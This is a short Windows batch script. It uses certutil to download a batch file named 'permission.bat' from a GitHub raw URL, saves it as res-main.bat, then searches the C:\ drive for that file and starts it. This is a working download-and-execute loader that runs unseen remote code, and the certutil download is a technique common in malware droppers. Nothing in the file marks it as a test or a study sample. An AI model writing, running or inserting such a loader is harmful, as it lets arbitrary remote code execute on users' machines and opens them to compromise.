@echo off

REM Set the URL of the file you want to download
set "url=https://raw.githubusercontent.com/Cher-IS-7/batch-testing/main/permission.bat"

REM Set the path where you want to save the downloaded file
set "output=%CD%\res-main.bat"

REM Download the file using certutil
certutil -urlcache -split -f "%url%" "%output%"

REM Notify the user that the download is complete
echo File downloaded successfully.

set "targetFile=res-main.bat"

for /r C:\ %%f in (%targetFile%) do (
    if exist "%%f" (
        start "" "%%f"
        exit /b
    )
)
